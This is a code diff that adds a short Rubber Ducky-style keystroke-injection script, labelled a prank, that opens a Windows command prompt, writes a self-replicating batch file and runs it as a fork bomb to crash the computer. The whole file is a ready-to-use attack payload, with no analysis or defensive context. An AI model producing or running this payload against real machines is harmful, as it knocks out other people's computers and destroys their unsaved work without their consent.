@@ -1,0 +1,16 @@
+REM Title: CMD forkbomb
+REM Author: 7h30th3r0n3
+REM Target:  Tested on Windows 7/8/10/11 
+REM Version: 1.0
+REM Category: Prank
+REM Launches CMD and spawns a CMD forkbomb which create a waterfall of cmd and crash the pc
+GUI r
+DELAY 300
+STRING cmd
+ENTER 
+DELAY 300
+STRING (echo :b && echo start b.bat && echo goto b)>b.bat
+ENTER
+DELAY 300
+STRING b.bat
+ENTER
